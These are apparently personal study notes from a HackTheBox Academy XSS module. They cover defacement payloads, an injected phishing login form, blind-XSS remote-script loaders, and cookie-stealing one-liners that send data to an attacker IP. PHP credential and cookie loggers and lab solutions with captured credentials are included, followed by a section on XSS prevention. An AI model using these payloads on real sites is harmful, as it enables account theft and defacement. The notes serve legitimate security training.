# Defacing:
Now hat we undestands the different types of XSS various methds of dicovering XSS vulnerbilities in new pagesm wew can start to exploit these XSS. The damage
and the scope of an XSS attack depends on the type of XSS, stored xSS begin the most critical, while a DOM-base begin less so.
One of the mos commonn attacks uaually used with stored XSS vulnerbilities os websited ddefacing attacks. Defeacing a website means changing it look for anyone
who visit the website. Is more common for hacker group to deface a website to claim that they had successfully heacked, like when hackers defaced th NHS nack in 2018.
Such attacks can carry creat medai echo and may significantly affect a company's investment and share prices.

- Defacement Elements:
 We injected JS code to make a web page look any way like, defacing a website is usually uisde to sedn a simple message, so giving the defaced web page a beauty look
 isn't the primary target.
    - For HTML elemets are usually utilized to change the main look of a web page.
        - Background color [document.body.style.background]
        - Background[document.body.background]
        - Page title [document.title]
        - Page text [Dom.innerHTML]

- Changing Background:
Stored CSS exercise and use it as a basis for our attacvk, u can go back to the stored XSS section to spawn the server and follow the next step.
To change a web page's background, we can choose a certain color or use an image, we will use a color as our background since most defacing attacks use dark for attack.
`<script>document.body.style.background= "#00000</script>`

This will be persistent through page refresh and will appear for anyone who visits the page, as we are utilizing a stored XSS.
Another payload:
`<script>documet.body.background = "http://../../../</>`

- Changing the page title:
Document.title  JS property:
`<script>document.title = 'HackTheBox Academy'</script>`

- Changing the Page title:
When we want to change the text displayed on th web app, we can utilize various JS funtioons fopr doing so. like [innerHTML],
`document.getElementByID("todo").innerHTML = "New text"`
We can also utilize JQuery funtions for more efficiently achiving the same thing or for changing the text of multiple elements in one line:
`$("#todo").html('New Text');`
This give us various options to customize the text the web page and make minor adjustements to meet our needs, as hacking groups usually leave a simple message on the web page
wasn leave nothing else on it, we change the intire HTML code of the main body using innerHTML:
`document.getElementByTagName('body')[0].innerHTML = "New text"`
We can specify the body elemet with document.getElementByTagName('body'), and specifying [0], we are selecting the first body element, which should change the entire text of the web pages.
We may also use JQuery to archive the same thing.
```html
<center>
    <h1 style="color: white">Cyber Security Training</h1>
    <p style="color: white">by
        <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
    </p>
</center>
```

> [!TIP]
> It woudl be wise to try running our HTML code locally to see how looks and to ensure that it runs as expected, before we commit to it our final payload.

We wil minify the HTML code into a single line and add it to our previous XSS payloads.
`<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>`
Once we add our payload to the vulnerable TO-do we will see that our HTML code is now permanently part of the web page's source code and shows our message for anyone who visist the page.

```html
<div></div><ul class="list-unstyled" id="todo"><ul>
<script>document.body.style.background = "#141d2b"</script>
</ul><ul><script>document.title = 'HackTheBox Academy'</script>
</ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'</script>
</ul></ul>
```

# Phishing:
Another very common type of XSS attack is phising attack, usually utilize legitimate-looking information to trick the vitims into sending their sensitive information to the attackes.
A common of XSS Phishing attacks is through injecting fake login from that send that send the login details to the attackers server, which may then be used to log in o behalf of the victim and gain control over their account and sensitive information.
Supposse we were to identify an CSS vulnerability in a web app for a particular organization. We can use such an attack as phising simulation exercise, which will also help us evaluate the Security awareness os the organization
employees.

- XSS Discovery:
We start by attempting to find the XSS vulnerability in the web at [/phishing] for the server at the end of the section, we visit web and see.
This form of image viwers is common in online and similar app, as we have control over the URL, wee can start by using basic XSS payload we using.
And get the dead img url icon
We must run the XSS Discovery process we previusly learned to find a working XSS payload.

> [!TIP]
> To undestand which payload should work, try to view how ur input is displayed in teh HTML source after u add it.

- Login From Injection:?
Once we identify a working XSS payload, we can procceed to the phising attact, to perform and XSS phishing attack, we must inject an HTML code thhat displays a login form on the targeted  page. This form send the login information
to server we are listening on, such that once user attempts to log in.
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
IN the above HTML code, [OUR_IP] which can find with the ip a command unter tun0. We will later be listening on this IP to retrive the credential sent form the form.
```html
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>
```
We should prepare our XSS code and test it on the vulnerable form, HTML code to the vulnerable page, we can use the JS funtion [document.write()] and use in it XSS payload
we found earlier in the XSS Discovery strep. Once we manify  our HTML code into a single line and add it inside thje write funtion, the JS code should be as:
`document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');`\
We can now injected this JS code using our XSS payload [alert(window.origin)] JS code we are exploiting a Reflected XSS vulnerability, so we can copy the URL and our XSS payload in its parameter, as
we've done in Reflected XSS section, adn the page should look as follow:
http://IP/phishing/index.php?url=..SNIP..

- Cleaning UP:
We can see that the URL fied is still displayed, which defeats our line of "Please login to continue", to encourage the victim to use the login form, we should remove the URL field, such
that they may think that they have to log in the be  able to use the page. We can use the JS funtion [document.getElementById().remove()] funtion.
To find id of the HTML element we want to remove, we can open the [PAge inspectior picker] and then click the element.
```html
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>

```
We can now use the id with the [remove()] funtion the URL from:
`document.getElementByID('urlfrom').remove();`
Now once added this code JS code we can use this new JS code in our payload.
`document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();`

We also see the there's still a pice of original HTML code left after our injected login form this can be removed by simply commenting it out.

- Credential Stealing:
We come to the part where we steal the login credentials when the victim attempts to log in oir injected login form. If we tried to log into the injected login form, u would
probably get the error [this site can't be reached]. As mentioned our HTML is designed to send the loging request to our IP our IP, which should be listening for connection. So let us
start a simple nc server.
`nc -lvnp 80`

As we can see we can capture the credential in the HTTP request URL[/?username=test&password=test]/ As we are only listening with nc, it will not handle the HTTP request correctly, and the victim would get an UNAble to connect error
which may raise some suspecious. We can use basic PHP script that logs the credentials form the HTTP request and the return the victim to the original page witout anyt injection.
The following Php script should what we need. proc/
```php
<?php
if (isset($_GET['username']) && isset ($_GET['password'])) {
    $file = fopen("creds.txt","a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n);
    header("Location: "); #IP and url of the page
    fclose($file);
    exit();
}
```
Now we have our script we can start the PHP listening server, which netcat

URL created:
http://10.129.195.234/phishing/index.php?url=document.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.15.193%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3B
[Wed Mar 26 17:21:58 2025] 10.129.195.234:50374 [302]: GET /?username=admin&password=p1zd0nt57341myp455&submit=Login

Explain the exercise:
Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a
malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form.
If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.

1. First we must to go the URL in http://.../phishing/send.php
We can see that we can XSS injection and we must to make a fake login in JS.
```js
'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.193:4444/><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```
After created the fake login we see the login page. And we must prepare the server to capture the traffic and see what happend.
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.195.234/phishing/login.php");
    fclose($file);
    exit();
}
?>
```
Create the sever and execute the commands for run it
```sh
sudo php index.php -S 0.0.0.0:80
PHP 8.4.5 Development Server (http://0.0.0.0:80) started
```
Now we paste the code again in the url to get the respond in the php server.
We must to change the url validate with decode url:
`http://10.129.195.234/phishing/index.php?url=document.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.15.193%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3B`
And see the server we get the credentials:
`10.129.195.234:50374 [302]: GET /?username=admin&password=p1zd0nt57341myp455&submit=Login`
Login like admin and gg.

## Session Hijacking:
Modern web app utilize cookies to maintain a user session thorught diff browsing sessions. This enable the uset to only log in once an keep thir logged-in session alive even if they visit the same wb at another time or date.
With the ability to execute JS code on th victim's browser we may be able to collecxt their cookies and send them to our sercer hijack their logged-in session by performing
a Session Hijacking and Cookie Stealing attack.

- Blind XSS Detection:
We usually start XSS attacks by trying to discover if and where an XSS vulnerability exists. We wll be dealin with blind XSS vulnerability. A Blind XSS vulnerbility occurs when the vulnerability is triggered on a page we dont have access to.
Some potential example:
    - Contact Forms
    - Reviews
    - User Datails
    - Support Tickets
    - HTTP User-agent header

Indicates that we'll not see how our input will be handled or how it will look in the browser since it will appear for the Admin only in certain Admin Panel that we do not have access to.
In normal cases, we can test each field until we get an alert box. We've been doing throughout the module. AS we do not have access over the Admin panel in this case, how would we be able to detect an XSS vulnerability
if we cannot see how the output is handle.

We can use the same trick that we used in the previus sectgion.
1. How can we know which specif field is vulnerable? Since any fields may execute our code, we cant know which of them did.
2. How can we know what XSS payload to use?

- Loading a remote script:
We can write Js code within the [<script>] tags, but can also include a remote script by providing it URL:
```html
<script src ="http://IP/scritp.js></script>"
```
We can use this tp execute remote JS file that is serverd on our VM. We can change the requested script name from script.js to the name of the field we are injecting.
```html
<script src ="http://IP/username></script>"
```
IF we get request for /username , them we know that the username field is vulnerable to XSS. We can start testing various XSS payloads that load a remote script and see which of them sends us a request.

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```
Various payloads start with an injection like >, which may or not may work depending on how our input handled the backend.
AS previus mentioned in the XSS Discovery section, if we access top the source code it would be possible to precisely write the required payload for a successful injection.

> [!TIP]
> We'll notice that the mail must match and email format wven if we try manipulating the HTTP request parameter, as it seems to be validated on both the front and back. The mail
> field is no vulnerable, and we can skip testing it. We may skip the pass field, as pass are usually hashed and not usually shon in cleatext. This helps to reducing the number of probabilities.

- Session Hijacking:
One we find working XSS payload and have identified the vulnerable input field, we can processed to xSS explotation and perform a SEssion Hijacking attack.
```js
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
Using any of the two payloads should work sending us a cookie, but we'll use the second one, as it simply adds an image tothe page, which may no be very malicius loocking, while the first navigate to our cookie
grabber PHP page, which may look suspicious.
`new Image().src='http://OUR_IP/index.php?c='+document.cookie`
`<script src=http://OUR_IP/script.js></script>`

Whit our php server running, we can now usw th code as part XSS payload, send it vulnerable input field, asn we should het a call to our server with th cookie value.
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
Then get the cookie and the scrio.js
```sh
 /script.js
 /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```
then we can cat the cookie and remplace in the storage in inspect section.

exercise:
Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the'
Admin's cookie and use it in 'login.php' to get the flag.

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>


```

"><script src= http://10.10.15.193:8080></script>

Whit this script we can connect to eh server of the web page, then we must do a script to snifff the traffic with that.

Or create the file script.js and add the
new Image().src='http://10.10.15.193:8080/index.php?c='+document.cookie
 GET /index.php?c=cookie=c00k1355h0u1d8353cu23d
Then replace the cookie for get the admin.


# XSS Prevention:
We should have a good undestanding of what an XSS vulnerbility is a its different type, how to detect an XSS vulnerbility and how to exploit XSS vulnerbilies.
As discussed previusly, XSS vulnerbilities are mainly linked to two parts of the web app:
- Source [user input field]
- Sink [Display data]

the most important aspect if preventing XSS vulnerbilities is proper input sanitazation and validation on both the front and back end.

## Front-end:
Web app is where most of the user input is taken from, it is essential to sanitaze and validate the user input on the front end using JS.
- Input validation:
We saw that thw web app will no allow us to submit the form it the email format is invalid.:
```js
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```
This code is testing the email input field and returning true or false whether it matches the Regex validation of an mail.
- Input sanitization:
We should always ensute that we do not allow any input JS code by escaping any special character. [Repository](https://github.com/cure53/DOMPurify)

```js
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```
- Direct input:
1. JS code <script></script>
2. CSS style code <style></style>
3. Tag/Attribute fields <div name='INPUT'></div>
4. HTML comments <!---->

If the user input goes any of the above example, it can inject malicius JS code. Which may lead to an XSS vulnerability. We should avoid usin JS funtions that allow changing raw text of HTML fields:
- DOM.innerHTML
- DOM.outerHTML
- document.write()
- document.writeln()
- document.domain

And Following JQuery:
- html()
- parseHTML()
- add()
- append()
- prepend()
- after()
- insertAfter()
- before()
- insertBefore()
- replaceAll()
- replaceWith()

## Back-end:
We should ensure that we prevent XSS vul with mesaure on the back-end to prevent Stored and Reflected XSS. AS we saw in the XSS Discovery section, even thought it had front-end input validation, this was not
enogugh to prevent us from injection malicius payload into the form.
This can archive with input and output and validation, Server conf, and Back-end tools that help to prevent.
Input Validation:
In the Back-end is quite similar to the front-end, and uses Regex or library funtion to ensure that the input field is what is expected.
Example of email validation:
```php
<?php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // do task
} else {
    // reject input - do not display it
}
>
```
- Input Sanitization:
When it comes to input sanitazation, then the backend play a vital role. as front end input sanitazation can be ez bypassed by sending custom GET or POST request.
We can use the addslashes funtion to sanitaze user input by escaping scpecial character with a backslash:
`addslashes($_GET['email'])`
We can use DOMPurify with the front-end:

```js
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```
- Output HTML encoding:
Another important aspect to pay attencion to the backend is Output encoding. This means we have to encode any special character into their html codes, which is helful
if we need to display the entire user input without introduccing XSS. We ca use for php backend htmlspecialchars or the htmlentitites funtions, which would encode certain
special character into their HTML codes, so the browser will display them correctly, but they will not cause any injection.
`htmlentities($_GET['email']);`
For NodeJS backend, we cna ute html-entities:
```js
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```
- Server configuration:
1. USing HTTPS across the entire domain.
2. Using XSS prevention headers.
3. Using the appropriate Content-type for the page, like X-Content-Type-Option=nonsniff.
4. Using Content-Securirty-Policy option, like script-src 'self', which only allows locally hosted script.
5. Using the HTTPOnly and Secure cookie flags to prevent JS form reading cookies and only transport them over HTTPS.

Having a good firewall [WAF] can significantly reduce the chances of XSS explotation, as it will automatically detect any types of injection going through HTTP request and will automatically reject such request.
[ASP.NET](https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-7.0)

